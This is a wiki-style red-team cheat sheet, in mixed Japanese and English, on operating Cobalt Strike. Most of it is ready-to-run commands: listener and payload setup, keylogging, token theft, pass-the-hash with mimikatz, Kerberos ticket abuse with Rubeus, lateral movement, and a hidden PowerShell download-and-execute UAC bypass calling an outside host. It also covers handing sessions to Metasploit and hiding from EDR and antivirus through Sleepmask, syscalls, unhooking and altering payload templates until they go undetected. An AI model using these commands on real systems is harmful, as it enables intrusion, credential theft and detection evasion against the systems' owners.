# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` で、リッスンする場所や使用する beacon の種類（http、dns、smb など）を選択できます。

### Peer2Peer Listeners

これらの listener の beacon は、C2 と直接通信する必要はありません。他の beacon を経由して通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` で、TCP または SMB beacon を選択します。

* **TCP beacon は、選択したポートで listener を設定します**。別の beacon から TCP beacon に接続するには、`connect <ip> <port>` コマンドを使用します。
* **SMB beacon は、選択した名前のパイプ名でリッスンします**。SMB beacon に接続するには、`link [target] [pipe]` コマンドを使用します。

### payload の生成とホスト

#### ファイル形式で payload を生成

`Attacks -> Packages ->`

* **`HTMLApplication`** は HTA ファイル用
* **`MS Office Macro`** はマクロ付きの Office ドキュメント用
* **`Windows Executable`** は .exe、.dll、または service .exe 用
* **`Windows Executable (S)`** は **stageless** の .exe、.dll、または service .exe 用（staged より stageless の方が優れており、IoC が少ない）

#### payload の生成とホスト

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` を選択すると、bitsadmin、exe、powershell、python などの形式で、Cobalt Strike から beacon をダウンロードするスクリプトまたは実行ファイルが生成されます。

#### payload のホスト

Web サーバーでホストするファイルがある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルと Web サーバーの設定を選択します。

### Beacon Options

<details>
<summary>Beacon options and commands</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### カスタムimplant / Linux Beacons

- カスタムagentは、Cobalt Strike Team ServerのHTTP/S protocol（デフォルトのmalleable C2 profile）を話すだけで、登録/check-inしてtaskを受信できます。profileで定義されたURI/header/metadata cryptoを実装すれば、taskの指示と出力にCobalt Strike UIを再利用できます。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script（例: `CustomBeacon.cna`）で、Windows以外のBeaconのpayload生成をラップすれば、operatorはlistenerを選択し、GUIから直接ELF payloadを生成できます。
- Team Serverに公開するLinux task handlerの例: `sleep`、`cd`、`pwd`、`shell`（任意のコマンドを実行）、`ls`、`upload`、`download`、`exit`。これらはTeam Serverが想定するtask IDに対応しており、適切な形式で出力を返すようサーバー側に実装する必要があります。
- LinuxでのBOFサポートは、[TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)を使ってBeacon Object Filesをプロセス内でロードすることで追加できます（Outflank形式のBOFにも対応）。これにより、新しいプロセスを起動せずに、implantのコンテキスト/権限内でモジュール型のpost-exploitationを実行できます。<sup>[[2]](#references)[[3]](#references)</sup>
  別のBOF tasking例とともに、Linuxのloader形式やプロセス境界に関する注意点を確認するには、[Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries)を参照してください。
- Windows Beaconsとのpivoting機能の同等性を保つため、カスタムBeaconにSOCKS handlerを組み込みます。operatorが` socks <port>`を実行したら、implantはローカルproxyを開き、operatorのtoolingを侵害済みLinuxホスト経由で内部ネットワークにルーティングします。

## Opsec

### Execute-Assembly

**`execute-assembly`**は、remote process injectionを使って**sacrificial process**内で指定されたprogramを実行します。プロセスへのinjectにはEDRが監視しているWin APIを使うため、非常に目立ちます。ただし、同じプロセス内に何かをロードするためのカスタムtoolもあります。

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- Cobalt Strikeでは、BOF (Beacon Object Files) も使用できます: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor Scriptの`https://github.com/outflanknl/HelpColor`を使うと、Cobalt Strikeに`helpx`コマンドが追加されます。このコマンドは、BOF（緑）、Frok&Run（黄）などのコマンドや、ProcessExecution、injectionなど（赤）を色分けして表示します。これにより、よりstealthyなコマンドを把握しやすくなります。

### Modern in-process post-execution

最近のバージョンでは、従来のCOFF BOFでは制約が大きすぎる場合に、次の2つの選択肢が追加されています。

- **Beacon Interpreter**は、Team Server上でCを中間bytecodeにcompileし、Beaconに組み込まれたVM内で実行します。bytecodeはnative executable codeではなくデータとして扱われるため、BOFのロード時に通常必要となる追加の実行可能領域の確保や、RWからRXへのpermission transitionを回避できます。scriptではBeacon APIをimportし、BOF形式のDynamic Function Resolution (DFR) prototypeを宣言できます。
- **BOF-PE**は、EXEまたはDLL全体を現在のBeaconにロードします。この形式は、Beacon APIを維持しながら、通常のPE import、exception handling、より豊富なC++機能、外部libraryをサポートします。小さなCOFF BOFより負荷が大きいため、追加runtimeが有用な場合にのみ選択してください。

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

これらのメカニズムが減らすのはローダー関連のシグナルであり、スクリプトの動作や Windows API 呼び出しによって発生するテレメトリではありません。<sup>[[8]](#references)</sup>

### ユーザーとして動作する

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` のようなイベントを確認できます。

- Security EID 4624 - 通常の稼働時間を把握するため、対話型ログオンをすべて確認します。
- System EID 12,13 - シャットダウン、起動、スリープの頻度を確認します。
- Security EID 4624/4625 - 受信した有効／無効な NTLM の試行を確認します。
- Security EID 4648 - 平文の認証情報を使ってログオンした際に生成されるイベントです。プロセスがこのイベントを生成した場合、そのバイナリには設定ファイルまたはコード内に平文の認証情報が含まれている可能性があります。

Cobalt Strike で `jump` を使う場合、新しいプロセスをより正規のものに見せるには、`wmi_msbuild` メソッドを使うのがおすすめです。

### コンピューターアカウントを使う

防御側がユーザーによる不審な動作を確認し、**サービスアカウントや `*$` のようなコンピューターアカウントを監視対象から除外する**ことはよくあります。これらのアカウントを使って、横移動や権限昇格を行うことができます。

### Stageless payloads を使う

Stageless payloads は C2 server から第2ステージをダウンロードする必要がないため、staged payloads よりも目立ちにくくなります。つまり、初回接続後にネットワークトラフィックが発生せず、ネットワークベースの防御に検知されにくくなります。

### Tokens & Token Store

トークンを盗んだり生成したりする際は注意してください。EDR がスレッドトークンを列挙し、プロセス内に**別のユーザー、または SYSTEM に属するトークン**があることを検知する可能性があります。

これにより、トークンを **beacon ごとに**保存できるため、同じトークンを何度も盗む必要がありません。横移動や、盗んだトークンを複数回使う必要がある場合に便利です。

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

横移動では、通常、新しいトークンを**生成する**、または pass the hash 攻撃を行うより、トークンを**盗む**ほうが適しています。

### Guardrails

Cobalt Strike には **Guardrails** という機能があり、防御側に検知される可能性のある特定のコマンドや操作の使用を防ぐのに役立ちます。Guardrails は、横移動や権限昇格によく使われる `make_token`、`jump`、`remote-exec` などの特定のコマンドをブロックするよう設定できます。

さらに、repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) にも、payload を実行する前に検討できるチェック項目やアイデアが掲載されています。

### Tickets encryption

AD では、チケットの暗号化に注意してください。一部のツールはデフォルトで Kerberos tickets に RC4 暗号化を使用しますが、これは AES 暗号化よりも安全性が低く、最新の環境では通常、デフォルトで AES が使用されます。弱い暗号化アルゴリズムを監視している防御側に検知される可能性があります。

### デフォルト設定を避ける

Cobalt Strike をデフォルトで使う場合、SMB pipes の名前は `msagent_####` と `"status_####` になります。これらの名前は変更してください。Cobalt Strike から `ls \\.\pipe\` コマンドを使って、既存の pipe 名を確認できます。

また、SSH sessions では `\\.\pipe\postex_ssh_####` という pipe が作成されます。`set ssh_pipename "<new_name>";` で変更してください。

post-exploitation 攻撃でも、`\\.\pipe\postex_####` の pipe は `set pipename "<new_name>"` で変更できます。

Cobalt Strike profiles では、次のような設定も変更できます。

- `rwx` の使用を避ける
- `process-inject {...}` ブロックで、プロセスインジェクションの動作（使用する API）を設定する
- `post-ex {…}` ブロックで "fork and run" の動作を設定する
- スリープ時間
- メモリにロードするバイナリの最大サイズ
- `stage {...}` ブロックで、メモリ使用量と DLL の内容を設定する
- ネットワークトラフィック

### Sleepmask と BeaconGate

Sleepmask は、Beacon とその追跡対象の heap allocations を休止中に変換し、タスクの実行時に元に戻します。現在のリリースでは、デフォルトで回避的な動作を提供しますが、メモリレイアウト、allocation、call stack の要件が異なる場合は、カスタム Sleepmask BOF が引き続き役立ちます。バージョン 4.13 以降、デフォルトの Sleepmask は BeaconGate 経由でプロキシされる API の return address も偽装します。<sup>[[8]](#references)</sup>

**BeaconGate** はこの設計を `Sleep` 以外にも拡張します。選択した WinAPI 呼び出しは `FUNCTION_CALL` structures として表現され、Sleepmask BOF に転送されます。これにより、呼び出しの実行中に Beacon をマスクできます。profile ではグループ（`Comms`、`Core`、`Cleanup`、`All`）単位、または個別の API のみを指定できます。<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

`beacon_gate` に登録された API では、gate が `syscall_method` より優先されます。登録されていない API では、設定済みの syscall method を引き続き使用できます。`beacon_gate disable` と `beacon_gate enable` を使うと、実行時にこの機能を切り替えられます。`All` をむやみに有効にするのは避けてください。たとえば `ps` は `OpenProcess`/`CloseHandle` を繰り返し呼び出すため、すべての呼び出しで Beacon をマスクおよびアンマスクすると、CPU 使用率が急上昇することがあります。Sleepmask-VS は、実行中の implant を使ったテストを繰り返さずにカスタム gate をデバッグできるよう、Beacon/Sleepmask の状態をモックします。<sup>[[9]](#references)</sup>

### ノイジーな proc injection

プロセスにコードを injection するのは、通常、非常にノイジーです。**通常のプロセスがこの操作を行うことはほとんどなく、実行方法も非常に限られているためです**。そのため、振る舞いベースの検知システムに検知される可能性があります。さらに、EDR がネットワークをスキャンして、**ディスク上に存在しないコードを含むスレッド**を検知する可能性もあります（JIT を使用するブラウザーなどのプロセスでは、よく見られます）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID と PPID の関係

新しいプロセスを spawn するときは、検知を避けるため、プロセス間の**一般的な親子関係を維持する**ことが重要です。たとえば、svchost.exe が iexplorer.exe を実行していると不審に見えます。通常の Windows 環境では、svchost.exe は iexplorer.exe の親プロセスではないからです。

Cobalt Strike で新しい beacon を spawn すると、デフォルトでは新しい listener を実行するために **`rundll32.exe`** を使ったプロセスが作成されます。これはあまりステルス性が高くなく、EDR に簡単に検知される可能性があります。さらに、`rundll32.exe` は引数なしで実行されるため、いっそう不審に見えます。

次の Cobalt Strike コマンドを使うと、新しい beacon を spawn する別のプロセスを指定でき、検知されにくくなります:

```bash
spawnto x86 svchost.exe
```

この設定 **`spawnto_x86` と `spawnto_x64`** は、profile でも変更できます。

### 攻撃者のトラフィックをプロキシする

攻撃者は、Linux マシン上でもツールをローカルで実行し、被害者のトラフィックをそのツールに到達させる必要がある場合があります（例：NTLM relay）。

また、pass-the.hash や pass-the-ticket 攻撃を行う際、被害者マシンの LSASS プロセスを変更するのではなく、攻撃者自身の LSASS プロセスにハッシュやチケットをローカルで**追加して**、そこから pivot するほうがステルス性に優れる場合があります。

ただし、**生成されるトラフィックには注意が必要です**。backdoor プロセスから、通常とは異なるトラフィック（Kerberos など？）を送信する可能性があるためです。この場合、ブラウザプロセスに pivot できます（ただし、プロセスに自分を注入すると検知される可能性があるため、ステルス性の高い方法を検討してください）。


### AV の回避

#### AV/AMSI/ETW Bypass

次のページを確認してください。


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常、`/opt/cobaltstrike/artifact-kit` には、Cobalt Strike が binary beacon の生成に使用する payload のコードと、コンパイル済みテンプレート（`/src-common` 内）があります。

生成された backdoor（またはコンパイル済みテンプレート）に [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、Defender の検知を引き起こしているものを特定できます。通常、それは文字列です。そのため、最終的な binary にその文字列が含まれないよう、backdoor を生成するコードを変更できます。

コードを変更したら、同じディレクトリから `./build.sh` を実行し、`dist-pipe/` フォルダーを Windows クライアントの `C:\Tools\cobaltstrike\ArtifactKit` にコピーしてください。

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

`dist-pipe\artifact.cna` の aggressive script を忘れずにロードしてください。これにより、Cobalt Strike はロード済みのリソースではなく、使用したいディスク上のリソースを使うようになります。

#### Resource Kit

ResourceKit フォルダーには、PowerShell、VBA、HTA など、Cobalt Strike のスクリプトベースの payload のテンプレートが含まれています。

テンプレートを [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) で調べると、Defender（この場合は AMSI）が何を問題視しているかを特定し、変更できます。

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

検出された行を変更すれば、検出されないテンプレートを作成できます。

Cobalt Strikeに、読み込まれているリソースではなく、指定したディスク上のリソースを使わせるには、攻撃的なスクリプト `ResourceKit\resources.cna` を読み込むのを忘れないでください。

#### Function hooks | Syscall

Function hookingは、EDRが悪意のあるアクティビティを検出するためによく使う手法です。Cobalt Strikeでは、**`None`** 設定を使って標準のWindows API呼び出しの代わりに**syscalls**を使用するか、**`Direct`** 設定で関数の `Nt*` バージョンを使用するか、Malleable Profileの**`Indirect`** オプションで `Nt*` 関数を飛び越えることで、これらのフックを回避できます。システムによっては、あるオプションのほうが別のオプションよりステルス性が高い場合があります。

これはProfileで設定するか、**`syscall-method`** コマンドを使用して設定できます。

ただし、これもノイズが多くなる可能性があります。

Cobalt Strikeには、[**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof)を使ってフックを削除する方法もあります。

また、[**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs)または[**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)を使って、どの関数にフックが設定されているかを確認することもできます。




<details>
<summary>Cobalt Strikeのその他のコマンド</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon（カスタムimplantのPoC）](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoaderとLinux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOFテンプレート](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strikeのメタデータ暗号化に関するUnit42の分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strikeの通信に関するSANS ISCの日誌](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13：翻訳の迷宮](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10：BeaconGateを通じて](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
